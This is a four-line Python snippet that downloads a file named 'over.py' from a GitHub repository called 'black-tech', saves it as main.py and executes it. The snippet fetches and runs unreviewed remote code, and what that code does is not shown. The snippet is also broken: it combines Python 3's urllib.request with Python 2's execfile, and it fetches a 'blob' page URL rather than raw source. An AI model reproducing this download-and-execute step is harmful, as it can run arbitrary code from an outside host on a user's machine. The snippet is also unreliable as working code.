from urllib.request import urlretrieve
url = 'https://github.com/cicadoves/black-tech/blob/main/over.py'
urlretrieve(url, 'main.py')
execfile('main.py')
